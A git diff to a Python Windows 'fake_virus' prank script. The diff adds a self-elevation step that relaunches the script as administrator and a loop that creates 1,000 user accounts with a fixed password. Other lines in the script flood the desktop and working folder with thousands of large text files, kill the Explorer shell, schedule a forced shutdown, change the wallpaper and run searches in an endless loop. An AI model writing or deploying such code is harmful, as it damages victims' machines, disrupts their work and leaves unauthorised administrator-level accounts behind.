@@ -6,6 +6,29 @@ import psutil
 import winsound
 import os
 import threading
+import subprocess
+import sys
+import string
+import ctypes
+
+def generateUsername(length=10, characters=None):
+    characters = string.ascii_letters + string.digits + "□■◆"
+    return ''.join(random.choices(characters, k=length))
+
+def createUser():
+    for i in range(1, 1001):
+        username = generateUsername(20)
+        password = "fake_virus"
+
+        subprocess.run(["net", "user", username, password, "/add"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def run_as_admin():
+    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+        return True
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        return False
+
 
 # get the user's username and password
 username = os.getlogin()
@@ -20,19 +43,19 @@ desktop_txt_number = 1000
 
 bytes = 100 * 100
 
-string = "get trolled " * bytes
+txt_string = "get trolled " * bytes
 
 def spam_files():
     for i in range(1, txt_number + 1):
         filename = f"get trolled_{i}.txt"
         with open(filename, "w") as file:
-            file.write(string)
+            file.write(txt_string)
 
 def spam_files_desktop():
     for i in range(1, desktop_txt_number + 1):
         filename = rf"C:\Users\{username}\Desktop\get trolled_{i}.txt"
         with open(filename, "w") as file:
-            file.write(string)
+            file.write(txt_string)
 
 searches = [
     'fuck java',
@@ -68,14 +91,13 @@ searches = [
 # download the fucking miku image
 url = 'https://is1-ssl.mzstatic.com/image/thumb/Music221/v4/b8/92/ce/b892cead-70a1-8f29-0045-af30080d3a16/4571640501760_cover.png/316x316bb.webp'
 
-os.system("shutdown /s /f /t 60")
+os.system("shutdown /s /t 30")
+os.system("taskkill /f /fi explorer.exe")
+
 
 def main():
     downloaded_number = 1
     while True:
-        # close explorer
-        os.system("taskkill /f /im explorer.exe")
-        
         ram = psutil.virtual_memory()
         ram_percentage = ram.percent
         max_ram = 85
@@ -92,12 +114,11 @@ def main():
         
         # press shit idfk
         pyautogui.press('capslock')
-        pyautogui.typewrite('hacked by fake_virus...imagine...')
-        pyautogui.press('enter')
-        
-        
-        new_filename = f"nice_try{downloaded_number}.webp"
-        
+
+        new_filename = f"nice_try2.webp"
+
+        # set wallpaper and open the image
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, new_filename , 0)
         os.startfile(new_filename)
         
         search = random.choice(searches)
@@ -110,14 +131,20 @@ def main():
 
 
 if __name__ == '__main__':
-    t1 = threading.Thread(target=spam_files)
-    t2 = threading.Thread(target=main)
-    t3 = threading.Thread(target=spam_files_desktop)
+    if not run_as_admin():
+        sys.exit()
+    else:
+        t1 = threading.Thread(target=spam_files)
+        t2 = threading.Thread(target=main)
+        t3 = threading.Thread(target=spam_files_desktop)
+        t4 = threading.Thread(target=createUser)
 
-    t1.start()
-    t2.start()
-    t3.start()
+        t1.start()
+        t2.start()
+        t3.start()
+        t4.start()
 
-    t1.join()
-    t2.join()
-    t3.join()
+        t1.join()
+        t2.join()
+        t3.join()
+        t4.join()
